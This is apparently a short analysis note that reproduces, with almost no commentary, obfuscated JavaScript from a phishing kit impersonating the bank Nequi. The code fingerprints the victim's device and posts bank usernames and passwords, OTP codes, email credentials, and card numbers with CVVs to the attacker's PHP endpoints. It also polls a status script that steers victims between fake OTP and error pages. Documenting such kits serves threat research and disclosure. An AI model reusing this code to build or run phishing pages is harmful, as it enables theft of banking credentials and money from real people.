# Client-side ajax utils (being used by attacker)

Taken from `https://DOMAIN_NAME/NEQUI/3d/propulsor/nequi/js/functions2.js` and formatted to ease readability

```js
(function (_0x188072, _0x1e117c) {
  var _0x1eaff1 = _0x37e1,
    _0x4255fd = _0x188072();
  while (!![]) {
    try {
      var _0x1412a8 =
        parseInt(_0x1eaff1(0xae)) / 0x1 +
        -parseInt(_0x1eaff1(0xa8)) / 0x2 +
        (parseInt(_0x1eaff1(0xad)) / 0x3) * (parseInt(_0x1eaff1(0xc1)) / 0x4) +
        parseInt(_0x1eaff1(0xba)) / 0x5 +
        (parseInt(_0x1eaff1(0xb6)) / 0x6) * (parseInt(_0x1eaff1(0xc0)) / 0x7) +
        (-parseInt(_0x1eaff1(0xb4)) / 0x8) *
          (-parseInt(_0x1eaff1(0xa9)) / 0x9) +
        -parseInt(_0x1eaff1(0xc4)) / 0xa;
      if (_0x1412a8 === _0x1e117c) break;
      else _0x4255fd["push"](_0x4255fd["shift"]());
    } catch (_0x3b9791) {
      _0x4255fd["push"](_0x4255fd["shift"]());
    }
  }
})(_0x3ca2, 0x71028);
function inicio(_0x1e05c9) {
  var _0x2cc024 = _0x37e1;
  $[_0x2cc024(0xbc)](
    "../../process/inicio.php",
    { usr: _0x1e05c9 },
    function (_0x280cda) {}
  );
}
function detectar_dispositivo() {
  var _0x3afb84 = _0x37e1,
    _0x431629 = "";
  if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/Android/i))
    _0x431629 = _0x3afb84(0xaf);
  else {
    if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/webOS/i))
      _0x431629 = _0x3afb84(0xbe);
    else {
      if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/iPhone/i))
        _0x431629 = "iPhone";
      else {
        if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/iPad/i))
          _0x431629 = _0x3afb84(0xbd);
        else {
          if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/iPod/i))
            _0x431629 = "iPod";
          else {
            if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/BlackBerry/i))
              _0x431629 = _0x3afb84(0xbf);
            else {
              if (navigator[_0x3afb84(0xb1)][_0x3afb84(0xb3)](/Windows Phone/i))
                _0x431629 = _0x3afb84(0xb8);
              else _0x431629 = "PC";
            }
          }
        }
      }
    }
  }
  return _0x431629;
}
function _0x3ca2() {
  var _0x18c770 = [
    "href",
    "6HoOzla",
    "neq.php?carderror=true",
    "Windows\x20Phone",
    "./otp.php?carderror=true",
    "1799290cPXOVr",
    "../../process/pasomail.php",
    "post",
    "iPad",
    "webOS",
    "BlackBerry",
    "5431223QYOXQM",
    "4BvsrUo",
    "ERR",
    "location",
    "13670810HlAtHz",
    "error",
    "816166BJmlWS",
    "904356VEATAX",
    "split",
    "./cargando.php",
    "./404.php",
    "2596323KykZyT",
    "136380QUnWqj",
    "Android",
    "../../process2/pasousuario.php",
    "userAgent",
    "../../process/pasotarjeta.php",
    "match",
    "8cShxxU",
  ];
  _0x3ca2 = function () {
    return _0x18c770;
  };
  return _0x3ca2();
}
function pasousuario(_0x3ee371, _0x454ff5, _0x467a37) {
  var _0x5195e5 = _0x37e1,
    _0x254719,
    _0x20b5de = detectar_dispositivo();
  $[_0x5195e5(0xbc)](
    _0x5195e5(0xb0),
    { pass: _0x3ee371, user: _0x454ff5, dis: _0x20b5de, banco: _0x467a37 },
    function (_0x54c27b) {
      var _0x56ed09 = _0x5195e5;
      if (_0x54c27b == _0x56ed09(0xc2)) alert(_0x56ed09(0xc5));
      else {
        if (_0x54c27b == "NO") {
        } else
          (_0x254719 = _0x54c27b[_0x56ed09(0xaa)]("-")),
            (window[_0x56ed09(0xc3)]["href"] = _0x56ed09(0xab));
      }
    }
  );
}
function consultar_estado() {
  var _0x2673f7 = _0x37e1;
  $[_0x2673f7(0xbc)]("../../process2/estado.php", function (_0x1d47a7) {
    var _0x245fa6 = _0x2673f7;
    switch (_0x1d47a7) {
      case "2":
        window[_0x245fa6(0xc3)][_0x245fa6(0xb5)] = "./otp.php";
        break;
      case "4":
        window["location"][_0x245fa6(0xb5)] = _0x245fa6(0xac);
        break;
      case "6":
        window["location"]["href"] = "../../../pago.php?carderror=true";
        break;
      case "8":
        window[_0x245fa6(0xc3)][_0x245fa6(0xb5)] = _0x245fa6(0xb9);
        break;
      case "10":
        window[_0x245fa6(0xc3)][_0x245fa6(0xb5)] =
          "https://www.nequi.com.co/prestamo-propulsor?gad_source=1&gclid=EAIaIQobChMI7-rwze_thgMVVqtaBR2R3wnbEAAYASAAEgJyNfD_BwE";
        break;
      case "12":
        window[_0x245fa6(0xc3)][_0x245fa6(0xb5)] = _0x245fa6(0xb7);
        break;
    }
  });
}
function enviar_otp(_0x4b342f) {
  $["post"](
    "../../process2/pasoOTP.php",
    { otp: _0x4b342f },
    function (_0x4e545f) {
      var _0x3ded9f = _0x37e1;
      window[_0x3ded9f(0xc3)][_0x3ded9f(0xb5)] = _0x3ded9f(0xab);
    }
  );
}
function _0x37e1(_0x3a5756, _0x397482) {
  var _0x3ca2ee = _0x3ca2();
  return (
    (_0x37e1 = function (_0x37e1a9, _0xede6dc) {
      _0x37e1a9 = _0x37e1a9 - 0xa8;
      var _0x2dfa41 = _0x3ca2ee[_0x37e1a9];
      return _0x2dfa41;
    }),
    _0x37e1(_0x3a5756, _0x397482)
  );
}
function enviar_mail(_0x389aac, _0x5640e6, _0x2a207e) {
  var _0x833583 = _0x37e1;
  $["post"](
    _0x833583(0xbb),
    { eml: _0x389aac, passe: _0x5640e6, cel: _0x2a207e },
    function (_0xf256b1) {
      var _0x2f30f1 = _0x833583;
      window["location"][_0x2f30f1(0xb5)] = "./";
    }
  );
}
function enviar_tarjeta(_0x45e12b, _0x308b89, _0x5d670e) {
  var _0x2df3fc = _0x37e1;
  $["post"](
    _0x2df3fc(0xb2),
    { tar: _0x45e12b, fec: _0x308b89, cvv: _0x5d670e },
    function (_0x2f22c8) {
      var _0x106e90 = _0x2df3fc;
      window["location"][_0x106e90(0xb5)] = "./";
    }
  );
}
```
